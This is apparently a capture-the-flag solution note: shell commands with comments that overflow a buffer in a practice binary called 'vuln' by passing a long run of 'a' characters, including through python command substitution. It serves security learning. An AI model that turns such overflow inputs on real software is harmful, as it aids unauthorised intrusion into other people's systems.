#vuln is an executable

./vuln

#prompt will say it takes an argument

.vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

#give it a big enough input to overflow the buffer and the flag shall be yours!

#alternatively, you can use command substitution if you dont want to manually write a bunch of a's

./vuln $(python -c "print 'a'*28")

#python -c tells bash to run this python command 
#$() places the output of the command as the argument to ./vuln run command
